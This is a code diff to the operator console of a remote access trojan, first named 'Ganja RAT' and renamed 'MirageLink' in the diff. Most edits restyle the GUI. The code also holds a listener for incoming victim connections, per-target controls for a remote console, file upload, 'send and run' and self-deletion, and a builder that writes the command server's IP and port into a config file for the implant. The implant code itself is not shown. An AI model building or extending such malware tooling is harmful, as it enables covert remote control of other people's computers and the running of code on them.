@@ -8,15 +8,15 @@ import threading
 from tkinter import messagebox
 from tkinter import filedialog
 
+pygame.init()
+pygame.mixer.init()
+
 SETTINGS_FILE = "settings.json"
 DEFAULT_SETTINGS = {
     "host": "127.0.0.1",
     "port": 5552,
     "theme": "default"
 }
-
-pygame.init()
-pygame.mixer.init()
 
 def load_settings():
     if not os.path.exists(SETTINGS_FILE):
@@ -66,7 +66,7 @@ class Server:
                     client_thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                     client_thread.start()
         
-                    sound = pygame.mixer.Sound('plus.mp3')
+                    sound = pygame.mixer.Sound('sounds/plus.mp3')
                     sound.play()
         except Exception as e:
             print(f"[-] Ошибка сервера: {e}")
@@ -99,6 +99,8 @@ class Server:
 
         except (ConnectionError, socket.error) as e:
             print(f"[-] Клиент {addr} отключился: {e}")
+        except (Exception) as e:
+            print(f"can t decode error: {e}")
         finally:
             print(f"[-] Подключение с {addr} закрыто")
             self.remove_client(addr)
@@ -218,23 +220,23 @@ class GanjaRATApp(ctk.CTk):
         self.create_app()
 
     def create_app(self):
-        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='#ffb68b')
-        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='Ganja RAT - made by GBW!', text_color='black', font=('Bold', 30))
+        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='#4B0082')
+        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='MirageLink - made by GBW!', text_color='black', font=('Bold', 30))
         self.gbw_frame.pack(side='top', fill='x')
         self.gbw_title.pack(side='left', pady=10)
 
-        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#1f1a16')
+        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#9370DB')
         self.menu.pack(side='top', fill='x')
 
         self.text_ip = ctk.CTkLabel(self.menu, text='IP', text_color='white', font=('Bold', 20))
         self.text_port = ctk.CTkLabel(self.menu, text='PORT', text_color='white', font=('Bold', 20))
         self.text_contry = ctk.CTkLabel(self.menu, text='CONTRY', text_color='white', font=('Bold', 20))
         self.builder_btn = ctk.CTkButton(self.menu, height=10, width=100, text='BUILD', text_color='red', font=('Bold', 15),
-                                          fg_color='black', command=self.draw_config_app, hover_color="#ffb68b")
+                                          fg_color='#9370DB', command=self.draw_config_app)
         self.info_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Info', text_color='red', font=('Bold', 15),
-                                          fg_color='black', command=self.draw_info_app, hover_color="#ffb68b")
+                                          fg_color='#9370DB', command=self.draw_info_app)
         self.setting_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Setting', text_color='red', font=('Bold', 15),
-                                          fg_color='black', command=self.draw_settings_app, hover_color="#ffb68b")
+                                          fg_color='#9370DB', command=self.draw_settings_app)
         self.text_ip.pack(side='left', padx=75)
         self.text_port.pack(side='left', padx=75)
         self.text_contry.pack(side='left', padx=75)
@@ -243,18 +245,18 @@ class GanjaRATApp(ctk.CTk):
         self.info_btn.pack(side='right', padx=5)
 
     def create_user(self, ip, port, country):
-        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='#ffb68b', corner_radius=10)
+        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='#4B0082', corner_radius=10)
         user_ground.pack(side='top', padx=10, pady=5, fill='x')
 
-        user_ip = ctk.CTkLabel(user_ground, text=f"IP: {ip}", text_color="black", font=('Bold', 15))
-        user_port = ctk.CTkLabel(user_ground, text=f"Port: {port}", text_color="black", font=('Bold', 15))
-        user_contry = ctk.CTkLabel(user_ground, text=f"Country: {country}", text_color="black", font=('Bold', 15))
+        user_ip = ctk.CTkLabel(user_ground, text=f"IP: {ip}", text_color="white", font=('Bold', 15))
+        user_port = ctk.CTkLabel(user_ground, text=f"Port: {port}", text_color="white", font=('Bold', 15))
+        user_contry = ctk.CTkLabel(user_ground, text=f"Country: {country}", text_color="white", font=('Bold', 15))
         user_ip.pack(side='left', padx=50)
         user_port.pack(side='left', padx=50)
         user_contry.pack(side='left', padx=50)
 
         select_func_button = ctk.CTkButton(user_ground, width=300, height=45, text='Function', font=('Bold', 20),
-                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port), fg_color='#1f1a16', hover_color='#1f1a16')
+                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port), fg_color='#9370DB')
         select_func_button.pack(side='right', pady=5, padx=5)
 
         self.user_frames.append(user_ground)
@@ -300,21 +302,26 @@ class SettingsApp(ctk.CTkToplevel):
         self.create_host_app()
 
     def create_host_app(self):
-        self.input_frame = ctk.CTkFrame(self, width=300, corner_radius=10, fg_color="#1f1a16")
-        self.input_frame.pack(side='top', pady=10, padx=10)
+        self.input_frame = ctk.CTkFrame(self, width=600, height=500, corner_radius=10, fg_color="gray30")
+        self.input_frame.pack(side='top', pady=10, padx=10, expand=True, fill='both')
 
-        self.label_host = ctk.CTkLabel(self.input_frame, text='Host and port', text_color='white', font=('Bold', 30))
+        self.label_host = ctk.CTkLabel(self.input_frame, text='Host and port', text_color='white', font=('Bold', 40))
         self.label_host.pack(side='top', pady=5, padx=10)
 
-        self.input_host = ctk.CTkEntry(self.input_frame, width=300, placeholder_text=f'HOST: {self.host}', font=('Bold', 20), text_color='green')
-        self.input_port = ctk.CTkEntry(self.input_frame, width=300, placeholder_text=f'PORT: {self.port}', font=('Bold', 20), text_color='green')
+        self.input_host = ctk.CTkEntry(self.input_frame, width=300, height=40, placeholder_text=f'HOST: {self.host}', font=('Bold', 20), text_color='green')
+        self.input_port = ctk.CTkEntry(self.input_frame, width=300, height=40, placeholder_text=f'PORT: {self.port}', font=('Bold', 20), text_color='green')
         self.input_host.pack(side='top', pady=5, padx=15)
         self.input_port.pack(side='top', pady=5, padx=15)
 
-        self.set_host_btn = ctk.CTkButton(self.input_frame, width=250, height=40, text='Set', fg_color='#ffb68b', font=('Bold', 30),
+        self.set_host_btn = ctk.CTkButton(self.input_frame, width=250, height=40, text='Set', font=('Bold', 30),
                                            command=self.update_host)
         self.set_host_btn.pack(padx=10, pady=5)
-    
+
+        self.set_theme_title = ctk.CTkLabel(self.input_frame, text='Theme', text_color='white', font=('Bold', 30))
+        self.set_theme_title.pack(side='left', pady=10, padx=10)
+        self.check = ctk.CTkSwitch(self.input_frame)
+        self.check.pack(side='left', pady=10, padx=10) 
+
     def update_host(self):
         host = self.input_host.get()
         port = int(self.input_port.get())
@@ -336,6 +343,21 @@ class InfoApp(ctk.CTkToplevel):
         self.geometry("600x500")
         self.resizable(False, False)
 
+        self.create_info_app()
+
+    def create_info_app(self):
+        self.info_frame = ctk.CTkFrame(self, width=600, height=500, corner_radius=15, fg_color='gray30')
+        self.info_frame.pack(pady=10, padx=10, fill='both', expand=True)
+
+        self.title_info = ctk.CTkLabel(self.info_frame, text='INFORMATION', font=('Bold', 50))
+        self.title_info.pack(side='top', pady=10)
+
+        self.team_text = ctk.CTkLabel(self.info_frame, text='Made by team GBW', font=('Bold', 30))
+        self.team_text.pack(side='top', pady=5)
+
+        self.about_text = ctk.CTkLabel(self.info_frame, text='about about anou about about anouabout about \n anouabout about anouabout about anouabout\n about anouabout about anouabout about anouabout\n about anou',
+                                        font=('Bold', 18))
+        self.about_text.pack(side='top', pady=5)
 
 class ConfigApp(ctk.CTkToplevel): 
     def __init__(self, parent):
@@ -348,25 +370,25 @@ class ConfigApp(ctk.CTkToplevel):
         self.create_config_app()
 
     def create_config_app(self):
-        self.login_frame = ctk.CTkFrame(self, width=300, fg_color="#1f1a16", corner_radius=10)
-        self.login_frame.pack(side='top', pady=10, padx=10)
+        self.login_frame = ctk.CTkFrame(self, fg_color="gray30", corner_radius=10)
+        self.login_frame.pack(side='top', pady=40, padx=20, fill="both", expand=True)
 
-        self.login_title = ctk.CTkLabel(self.login_frame, text='Build config file', text_color='white', font=('Bold', 30))
+        self.login_title = ctk.CTkLabel(self.login_frame, text='Build config file', text_color='green', font=('Bold', 60))
         self.login_title.pack(side='top', pady=10)
 
-        self.entry_ip = ctk.CTkEntry(self.login_frame, width=300, placeholder_text="IP", text_color='green', font=('Bold', 20))
-        self.entry_ip.pack(pady=5, padx=15)
+        self.entry_ip = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="IP", text_color='green', font=('Bold', 50))
+        self.entry_ip.pack(pady=10, padx=20)
 
-        self.entry_port = ctk.CTkEntry(self.login_frame, width=300, placeholder_text="PORT", text_color='green', font=('Bold', 20))
-        self.entry_port.pack(pady=5, padx=15)
+        self.entry_port = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="PORT", text_color='green', font=('Bold', 50))
+        self.entry_port.pack(pady=10, padx=20)
 
-        self.btn = ctk.CTkButton(self.login_frame, width=250, height=40, text="Enter", fg_color='#ffb68b', command=self.remove_frame)
+        self.btn = ctk.CTkButton(self.login_frame, width=250, height=50, text="Enter", command=self.remove_frame)
         self.btn.pack()
 
     def build_info_file(self, ip, port):
-        config_info_list = [f'{ip}\n', f'{port}\n']
+        config_info_list = [f'{ip}\n', f'{port}']
         try:
-            with open('playit.txt', 'w', encoding='utf-8') as file:
+            with open('a.txt', 'w', encoding='utf-8') as file:
                 file.writelines(config_info_list)
             return True
         except Exception:
@@ -400,15 +422,14 @@ class FunctionApp(ctk.CTk):
         #self.comm.download_file(ip, port, 'playit.txt') - скачивание файла
     
     def create_func_app(self):
-        self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='#ffb68b')
+        self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='#4B0082')
         self.gbw_func_title = ctk.CTkLabel(self.gbw_func_frame, text=f'Func for target: {self.ip}', text_color='black', font=('Bold', 25))
         self.gbw_func_frame.pack(side='top', fill='x')
         self.gbw_func_title.pack(side='top', pady=10)
 
-        self.tabview = ctk.CTkTabview(self, segmented_button_selected_hover_color='#1f1a16', segmented_button_selected_color='#1f1a16')
+        self.tabview = ctk.CTkTabview(self)
         self.tabview.pack(side='top', fill='both', expand=True)
 
-        self.tabview.add("Function")
         self.tabview.add("Fun")
         self.tabview.add("System")
         self.tabview.add("Files")
@@ -417,30 +438,27 @@ class FunctionApp(ctk.CTk):
         self.add_content_to_tabs()
 
     def add_content_to_tabs(self):
-        self.func_tab = self.tabview.tab("Function")
-    
-        self.ping_btn = ctk.CTkButton(self.func_tab, text='DELETE YOURSELF FROM PC', height=50, width=500, fg_color='red', 
-                                       command=lambda: self.comm.kill_yourself(self.ip, self.port, "exit"), font=('Bold', 20))
-        self.send_file_btn = ctk.CTkButton(self.func_tab, text='Sendfile', height=50, width=200, fg_color='#ffb68b', text_color="black",
-                                       command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15))
-        self.send_and_run_btn = ctk.CTkButton(self.func_tab, text='Send and run', height=50, width=200, fg_color='#ffb68b', text_color="black",
-                                       command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15))
-        self.console_btn = ctk.CTkButton(self.func_tab, text='Console', height=50, width=200, fg_color='#ffb68b', text_color="black",
-                                       command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15))
-        
-        self.ping_btn.pack(side='bottom', pady=20, padx=20)
-        self.send_file_btn.pack(side='top', pady=10, padx=50)
-        self.send_and_run_btn.pack(side='top', pady=10, padx=50)
-        self.console_btn.pack(side='top', pady=10, padx=50)
-
-
         self.fun_tab = self.tabview.tab("Fun")
         
 
         self.sys_tab = self.tabview.tab("System")
+        self.console_btn = ctk.CTkButton(self.sys_tab, text='Console', height=50, width=200,
+                                command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
+        self.ping_btn = ctk.CTkButton(self.sys_tab, text='DELETE YOURSELF FROM PC', height=50, width=500, fg_color='red', 
+                                       command=lambda: self.comm.kill_yourself(self.ip, self.port, "exit"), font=('Bold', 20))
+        
+        self.ping_btn.pack(side='bottom', pady=20, padx=20)
+        self.console_btn.pack(side='top', pady=10, padx=50)
         
 
         self.file_tab = self.tabview.tab("Files")
+        self.send_and_run_btn = ctk.CTkButton(self.file_tab, text='Send and run', height=50, width=200,
+                                       command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
+        self.send_file_btn = ctk.CTkButton(self.file_tab, text='Sendfile', height=50, width=200,
+                                       command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
+        
+        self.send_file_btn.pack(side='top', pady=10, padx=50)
+        self.send_and_run_btn.pack(side='top', pady=10, padx=50)
         
 
         self.info_tab = self.tabview.tab("Info")
